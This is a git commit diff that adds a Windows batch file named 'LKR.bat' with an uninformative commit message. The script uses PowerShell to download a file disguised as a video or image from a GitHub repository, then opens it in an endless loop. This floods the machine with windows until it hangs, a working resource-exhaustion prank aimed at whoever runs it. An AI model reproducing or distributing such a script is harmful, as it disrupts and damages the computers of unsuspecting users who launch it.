ce884a9c023e17656ea841d5522dc5bf3134f820
LKR-beta <gbu23224@gmail.com>
2024-07-29 17:18:16 +0900

    Add files via upload

---
+++ LKR.bat
@@ -0,0 +1,12 @@
+@echo off
+cls
+
+
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg','C:\your\asylum\Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg')"
+
+:loop
+start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
+start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
+start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
+start  Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.jpg
+ goto loop
